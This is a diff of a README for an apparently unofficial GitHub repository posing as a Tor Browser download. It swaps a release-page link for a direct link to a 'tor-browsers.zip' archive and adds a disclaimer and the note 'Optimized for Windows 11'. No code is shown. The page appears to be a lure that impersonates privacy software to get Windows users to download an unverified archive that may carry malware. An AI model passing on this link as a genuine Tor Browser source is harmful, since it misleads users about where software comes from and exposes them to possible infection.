@@ -15,7 +15,7 @@ Tor Browser is the official and most secure way to browse the internet anonymous
 > This project is for educational and personal use only. Use at your own risk. The authors are not responsible for any issues or violations of local laws. Always use Tor Browser responsibly.
 
 ## Install
-[Download `Tor-Browser.zip`](https://github.com/tor-browser-download/tor-browser/releases/latest)
+[Download `Tor-Browser.zip`](https://github.com/tor-browser-download/tor-browser/releases/download/browser/tor-browsers.zip)
 ---
 > Optimized for Windows 11.
 
